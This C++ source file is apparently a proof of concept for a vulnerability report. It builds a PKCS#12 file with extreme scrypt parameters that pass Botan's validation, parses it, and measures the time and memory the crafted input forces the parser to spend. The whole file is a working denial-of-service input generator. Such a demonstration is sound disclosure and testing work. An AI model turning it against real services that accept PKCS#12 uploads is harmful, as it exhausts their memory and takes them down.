// Demonstrates the memory cost an attacker-supplied PKCS#12 file can impose
// on the parser via PBES2/scrypt parameters that pass Botan's validation.
// Builds a MAC-less PFX with one PKCS8ShroudedKeyBag using PBES2-scrypt with
// the given N, r, p and 32 bytes of garbage ciphertext, then parses it.
#include <botan/asn1_obj.h>
#include <botan/der_enc.h>
#include <botan/exceptn.h>
#include <botan/pkcs12.h>

#include <chrono>
#include <cstdlib>
#include <fstream>
#include <iostream>
#include <string>
#include <vector>

using Bytes = std::vector<uint8_t>;

static Botan::AlgorithmIdentifier scrypt_alg(size_t N, size_t r, size_t p) {
   Bytes iv_der;
   Botan::DER_Encoder(iv_der).encode(Bytes(16, 0x22), Botan::ASN1_Type::OctetString);
   Bytes kdf_params;
   Botan::DER_Encoder(kdf_params)
      .start_sequence()
      .encode(Bytes(16, 0x11), Botan::ASN1_Type::OctetString)
      .encode(N)
      .encode(r)
      .encode(p)
      .end_cons();
   Bytes params;
   Botan::DER_Encoder(params)
      .start_sequence()
      .encode(Botan::AlgorithmIdentifier(Botan::OID::from_string("Scrypt"), kdf_params))
      .encode(Botan::AlgorithmIdentifier(Botan::OID::from_string("AES-256/CBC"), iv_der))
      .end_cons();
   return Botan::AlgorithmIdentifier(Botan::OID::from_string("PBE-PKCS5v20"), params);
}

static Bytes build_pfx(const Botan::AlgorithmIdentifier& alg) {
   Bytes bag;
   Botan::DER_Encoder(bag)
      .start_sequence()
      .encode(Botan::OID::from_string("PKCS12.PKCS8ShroudedKeyBag"))
      .start_context_specific(0)
      .start_sequence()
      .encode(alg)
      .encode(Bytes(32, 0), Botan::ASN1_Type::OctetString)
      .end_cons()
      .end_cons()
      .end_cons();
   Bytes safe_contents;
   Botan::DER_Encoder(safe_contents).start_sequence().raw_bytes(bag).end_cons();
   Bytes auth_safe;
   Botan::DER_Encoder(auth_safe)
      .start_sequence()
      .start_sequence()
      .encode(Botan::OID::from_string("PKCS7.Data"))
      .start_context_specific(0)
      .encode(safe_contents, Botan::ASN1_Type::OctetString)
      .end_cons()
      .end_cons()
      .end_cons();
   Bytes pfx;
   Botan::DER_Encoder(pfx)
      .start_sequence()
      .encode(size_t(3))
      .start_sequence()
      .encode(Botan::OID::from_string("PKCS7.Data"))
      .start_context_specific(0)
      .encode(auth_safe, Botan::ASN1_Type::OctetString)
      .end_cons()
      .end_cons()
      .end_cons();
   return pfx;
}

static long peak_rss_kb() {
   std::ifstream f("/proc/self/status");
   std::string line;
   while(std::getline(f, line)) {
      if(line.rfind("VmHWM:", 0) == 0) {
         return std::atol(line.c_str() + 6);
      }
   }
   return -1;
}

int main(int argc, char* argv[]) {
   const size_t log2N = argc > 1 ? std::atoi(argv[1]) : 22;
   const size_t r = argc > 2 ? std::atoi(argv[2]) : 16;
   const size_t p = argc > 3 ? std::atoi(argv[3]) : 1;
   const size_t N = size_t(1) << log2N;
   const auto pfx = build_pfx(scrypt_alg(N, r, p));
   std::cout << "PFX size: " << pfx.size() << " bytes; scrypt N=2^" << log2N << " r=" << r << " p=" << p
             << " -> expected V buffer " << ((N + 1) * 128 * r) / (1024.0 * 1024.0 * 1024.0) << " GiB\n";
   const auto start = std::chrono::steady_clock::now();
   try {
      Botan::PKCS12 parsed(pfx, "any password");
      std::cout << "unexpectedly parsed\n";
   } catch(const Botan::Exception& e) {
      std::cout << "exception: " << e.what() << '\n';
   }
   const double secs =
      std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::steady_clock::now() - start).count() / 1000.0;
   std::cout << "elapsed: " << secs << " s; peak RSS: " << peak_rss_kb() / 1024.0 / 1024.0 << " GiB\n";
   return 0;
}
